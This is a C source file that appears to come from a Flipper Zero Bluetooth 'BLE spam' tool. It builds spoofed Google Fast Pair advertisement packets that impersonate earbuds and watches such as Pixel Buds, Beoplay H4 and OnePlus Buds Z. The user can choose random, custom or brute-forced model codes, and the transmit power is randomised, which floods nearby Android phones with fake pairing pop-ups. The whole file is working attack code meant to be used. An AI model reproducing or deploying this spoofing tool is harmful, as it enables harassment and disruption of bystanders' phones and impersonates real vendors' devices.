#include "fastpair.h"
#include "_protocols.h"
#include <ble_spam_icons.h>

// Hacked together by @Willy-JL and @Spooks4576
// Documentation at https://developers.google.com/nearby/fast-pair/specifications/introduction

static const struct {
    uint32_t value;
    const char* name;
} models[] = {
    {0x0B0000, "Google Gphones V1"},
    {0x0C0000, "Google Gphones V2"},
    {0x00000C, "Google Gphones V3"},
    {0x00000B, "Google Gphones V4"},
    {0x6AD226, "TicWatch Pro 3"},
    {0x91AA04, "Beoplay H4 V1"},
    {0x04AA91, "Beoplay H4 V2"},
    {0x9CA277, "YY2963 V1"},
    {0xCC754F, "YY2963 V2"},
    {0x03B716, "YY2963 V3"},
    {0xE07634, "OnePlus Buds Z"},
};
static const uint16_t models_count = COUNT_OF(models);

static const char* get_name(const Payload* payload) {
    UNUSED(payload);
    return "FastPair";
}

static void make_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    Fastpair_mtCfg* cfg = payload ? &payload->cfg.fastpair_mt : NULL;

    uint32_t model;
    switch(cfg ? payload->mode : PayloadModeRandom) {
    case PayloadModeRandom:
    default:
        model = models[rand() % models_count].value;
        break;
    case PayloadModeValue:
        model = cfg->model;
        break;
    case PayloadModeBruteforce:
        model = cfg->model = payload->bruteforce.value;
        break;
    }

    uint8_t size = 14;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...

    packet[i++] = 6; // Size
    packet[i++] = 0x16; // AD Type (Service Data)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...
    packet[i++] = (model >> 0x10) & 0xFF; // Device Model
    packet[i++] = (model >> 0x08) & 0xFF; // ...
    packet[i++] = (model >> 0x00) & 0xFF; // ...

    packet[i++] = 2; // Size
    packet[i++] = 0x0A; // AD Type (Tx Power Level)
    packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

    *_size = size;
    *_packet = packet;
}

enum {
    _ConfigExtraStart = ConfigExtraStart,
    ConfigModel,
    ConfigInfoRequire,
    ConfigCOUNT,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(index) {
    case ConfigModel:
        scene_manager_next_scene(ctx->scene_manager, SceneFastpairModel);
        break;
    case ConfigInfoRequire:
        break;
    default:
        ctx->fallback_config_enter(ctx, index);
        break;
    }
}
static void extra_config(Ctx* ctx) {
    Payload* payload = &ctx->attack->payload;
    Fastpair_mtCfg* cfg = &payload->cfg.fastpair_mt;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;

    item = variable_item_list_add(list, "Model Code", 0, NULL, NULL);
    const char* model_name = NULL;
    char model_name_buf[9];
    switch(payload->mode) {
    case PayloadModeRandom:
    default:
        model_name = "Random";
        break;
    case PayloadModeValue:
        for(uint16_t i = 0; i < models_count; i++) {
            if(cfg->model == models[i].value) {
                model_name = models[i].name;
                break;
            }
        }
        if(!model_name) {
            snprintf(model_name_buf, sizeof(model_name_buf), "%06lX", cfg->model);
            model_name = model_name_buf;
        }
        break;
    case PayloadModeBruteforce:
        model_name = "Bruteforce";
        break;
    }
    variable_item_set_current_value_text(item, model_name);

    variable_item_list_add(list, "Requires Google services", 0, NULL, NULL);

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

static uint8_t config_count(const Payload* payload) {
    UNUSED(payload);
    return ConfigCOUNT - ConfigExtraStart - 1;
}

const Protocol protocol_fastpair_mt = {
    .icon = &I_android,
    .get_name = get_name,
    .make_packet = make_packet,
    .extra_config = extra_config,
    .config_count = config_count,
};

static void model_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    Fastpair_mtCfg* cfg = &payload->cfg.fastpair_mt;
    switch(index) {
    case 0:
        payload->mode = PayloadModeRandom;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case models_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneFastpairModelCustom);
        break;
    case models_count + 2:
        payload->mode = PayloadModeBruteforce;
        payload->bruteforce.counter = 0;
        payload->bruteforce.value = cfg->model;
        payload->bruteforce.size = 3;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    default:
        payload->mode = PayloadModeValue;
        cfg->model = models[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_fastpair_mt_model_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    Fastpair_mtCfg* cfg = &payload->cfg.fastpair_mt;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    submenu_reset(submenu);

    submenu_add_item(submenu, "Random", 0, model_callback, ctx);
    if(payload->mode == PayloadModeRandom) {
        selected = 0;
    }

    bool found = false;
    for(uint16_t i = 0; i < models_count; i++) {
        submenu_add_item(submenu, models[i].name, i + 1, model_callback, ctx);
        if(!found && payload->mode == PayloadModeValue && cfg->model == models[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", models_count + 1, model_callback, ctx);
    if(!found && payload->mode == PayloadModeValue) {
        selected = models_count + 1;
    }

    submenu_add_item(submenu, "Bruteforce", models_count + 2, model_callback, ctx);
    if(payload->mode == PayloadModeBruteforce) {
        selected = models_count + 2;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_fastpair_mt_model_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_fastpair_mt_model_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void model_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    Fastpair_mtCfg* cfg = &payload->cfg.fastpair_mt;
    payload->mode = PayloadModeValue;
    cfg->model =
        (ctx->byte_store[0] << 0x10) + (ctx->byte_store[1] << 0x08) + (ctx->byte_store[2] << 0x00);
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_fastpair_mt_model_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    Fastpair_mtCfg* cfg = &payload->cfg.fastpair_mt;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Model Code");

    ctx->byte_store[0] = (cfg->model >> 0x10) & 0xFF;
    ctx->byte_store[1] = (cfg->model >> 0x08) & 0xFF;
    ctx->byte_store[2] = (cfg->model >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, model_custom_callback, NULL, ctx, (void*)ctx->byte_store, 3);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_fastpair_mt_model_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_fastpair_mt_model_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}
